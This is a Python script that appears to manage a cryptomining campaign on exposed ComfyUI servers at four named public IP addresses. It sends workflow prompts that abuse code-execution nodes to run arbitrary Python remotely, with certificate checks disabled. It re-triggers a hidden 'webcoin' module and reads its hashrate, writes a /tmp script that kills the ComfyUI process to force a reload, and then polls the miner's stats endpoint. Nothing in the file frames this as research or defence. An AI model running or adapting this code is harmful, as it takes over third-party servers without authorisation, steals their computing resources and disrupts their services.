"""
Phase 1: Re-trigger orchestration on 183.6.93.120 and 182.92.111.146 to start DashboardServer.
Phase 2: Force ComfyUI restart on 43.218.199.5 and 194.6.247.91 so webcoin loads.
"""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def send_prompt(base, nodes, timeout_s=15):
    prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
        "workflow": {"nodes": [{"id": int(k), "type": v["class_type"]} for k, v in nodes.items()]}
    }}}
    body = json.dumps(prompt).encode()
    req = urllib.request.Request(
        f"{base}/prompt", data=body,
        headers={"Content-Type": "application/json"}, method="POST"
    )
    kw = {"timeout": timeout_s}
    if base.startswith("https"):
        kw["context"] = ctx
    with urllib.request.urlopen(req, **kw) as r:
        return json.loads(r.read())


def run_ide(base, code, wait=30):
    nodes = {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
    }
    try:
        resp = send_prompt(base, nodes)
        if "error" in resp:
            print(f"    IDENode rejected: {json.dumps(resp.get('error',''))[:100]}", flush=True)
            return None
        pid = resp.get("prompt_id")
        print(f"    IDENode accepted ({pid[:8]}), waiting {wait}s...", flush=True)
        time.sleep(wait)
        try:
            req = urllib.request.Request(f"{base}/history/{pid}")
            kw = {"timeout": 10}
            if base.startswith("https"):
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                hist = json.loads(r.read())
            entry = hist.get(pid, {})
            outputs = entry.get("outputs", {})
            texts = []
            for nid, nout in outputs.items():
                for key, val in nout.items():
                    if isinstance(val, list):
                        texts.extend(str(v) for v in val)
                    elif isinstance(val, str):
                        texts.append(val)
            return "\n".join(texts) if texts else "(no output)"
        except Exception as e:
            return f"(history: {e})"
    except Exception as e:
        print(f"    IDENode error: {e}", flush=True)
        return None


def run_srl(base, code, wait=30):
    nodes = {
        "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
        "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
    }
    try:
        resp = send_prompt(base, nodes)
        if "error" in resp:
            return None
        pid = resp.get("prompt_id")
        print(f"    SRL Eval accepted ({pid[:8]}), waiting {wait}s...", flush=True)
        time.sleep(wait)
        return "(executed)"
    except Exception:
        return None


# ═════════════════════════════════════════════════════════════════
# PHASE 1: Re-trigger orchestration for machines with webcoin loaded
# ═════════════════════════════════════════════════════════════════

REORCH_CODE = '''
import sys, os, importlib, threading

lines = []
try:
    wc_mod = None
    for name, mod in sys.modules.items():
        if hasattr(mod, '__file__') and mod.__file__ and 'webcoin' in str(mod.__file__) and '__init__' in str(mod.__file__):
            wc_mod = mod
            break

    if not wc_mod:
        lines.append('webcoin_module=NOT_FOUND_IN_MODULES')
        for name in sorted(sys.modules.keys()):
            if 'webcoin' in name or 'comfyui_enhanced' in name.lower():
                lines.append('  found=' + name)
    else:
        lines.append('webcoin_module=' + str(wc_mod.__name__))
        lines.append('orch_done=' + str(getattr(wc_mod, '_orch_done', '?')))
        lines.append('dashboard_ref=' + str(getattr(wc_mod, '_dashboard_ref', '?')))
        lines.append('latest_stats=' + str(getattr(wc_mod, '_latest_stats', '?')))

        # Reset and re-run orchestration
        wc_mod._orch_done = False
        t = threading.Thread(target=wc_mod._orchestrate, daemon=True, name="re-orch")
        t.start()
        import time
        time.sleep(15)
        lines.append('re_orch=started')
        lines.append('orch_done_after=' + str(getattr(wc_mod, '_orch_done', '?')))
        lines.append('dashboard_after=' + str(getattr(wc_mod, '_dashboard_ref', '?')))
        ls = getattr(wc_mod, '_latest_stats', {})
        if ls:
            lines.append('stats_keys=' + str(list(ls.keys())))
            cpu = ls.get('cpu')
            if cpu:
                lines.append('cpu_hr=' + str(cpu.get('hashrate_now', '?')))
        else:
            lines.append('stats=still_empty')
except Exception as e:
    import traceback
    lines.append('ERROR: ' + traceback.format_exc()[-200:])
result = chr(10).join(lines)
'''

print("="*60)
print("  PHASE 1: Re-trigger orchestration")
print("="*60)

for ip, base in [("183.6.93.120", "http://183.6.93.120:8188"),
                 ("182.92.111.146", "http://182.92.111.146:8188")]:
    print(f"\n  {ip}:", flush=True)
    r = run_ide(base, REORCH_CODE, wait=25)
    if r:
        print(f"  Result:\n{r}", flush=True)
    else:
        print(f"  FAILED", flush=True)

# ═════════════════════════════════════════════════════════════════
# PHASE 2: Force restart ComfyUI on machines without webcoin loaded
# ═════════════════════════════════════════════════════════════════

RESTART_CODE = '''
import subprocess, os, time

lines = []
try:
    # Find ComfyUI root
    comfy = None
    for p in ['/root/ComfyUI', '/home/ubuntu/ComfyUI', '/workspace/ComfyUI',
              '/opt/ComfyUI', '/app/ComfyUI']:
        if os.path.isdir(p):
            comfy = p
            break
    lines.append('comfy=' + str(comfy))

    if comfy:
        wc = os.path.join(comfy, 'custom_nodes', 'webcoin')
        lines.append('webcoin=' + str(os.path.isdir(wc)))
        if os.path.isdir(wc):
            bd = os.path.join(wc, 'bin')
            lines.append('bin=' + str(os.listdir(bd) if os.path.isdir(bd) else 'NO_DIR'))

    # Find ComfyUI main process
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
    comfy_procs = [l for l in r.stdout.splitlines() if 'main.py' in l or 'comfyui' in l.lower()]
    for p in comfy_procs[:3]:
        lines.append('proc=' + p.strip()[:120])

    # Schedule restart: nohup bash that waits 3s then kills/restarts
    restart_script = os.path.join('/tmp', '_restart_comfy.sh')
    with open(restart_script, 'w') as f:
        f.write('#!/bin/bash\\n')
        f.write('sleep 3\\n')
        f.write('pkill -f "python.*main.py"\\n')
        f.write('sleep 2\\n')
        f.write('# supervisor/systemd should auto-restart ComfyUI\\n')
    os.chmod(restart_script, 0o755)
    subprocess.Popen(['nohup', 'bash', restart_script],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     start_new_session=True)
    lines.append('restart=scheduled')
except Exception as e:
    lines.append('ERROR=' + str(e)[:100])
result = chr(10).join(lines)
'''

print(f"\n{'='*60}")
print("  PHASE 2: Restart ComfyUI on 43.218.199.5 and 194.6.247.91")
print("="*60)

for ip, base in [("43.218.199.5", "http://43.218.199.5:80"),
                 ("194.6.247.91", "http://194.6.247.91:8188")]:
    print(f"\n  {ip}:", flush=True)
    r = run_srl(base, RESTART_CODE, wait=10)
    if r:
        print(f"  {r}", flush=True)
    else:
        print(f"  FAILED to send restart command", flush=True)

print(f"\n  Waiting 45s for restarts...", flush=True)
time.sleep(45)

print(f"\n  Checking if webcoin loaded after restart...", flush=True)
for ip, base in [("43.218.199.5", "http://43.218.199.5:80"),
                 ("194.6.247.91", "http://194.6.247.91:8188")]:
    try:
        req = urllib.request.Request(f"{base}/api/enhanced/stats",
                                    headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
            print(f"  {ip}: STATS OK -> {json.dumps(data)[:200]}", flush=True)
    except urllib.error.HTTPError as e:
        print(f"  {ip}: HTTP {e.code} (still not loaded)", flush=True)
    except Exception as e:
        print(f"  {ip}: {str(e)[:100]} (might still be restarting)", flush=True)

print("\nDone.", flush=True)
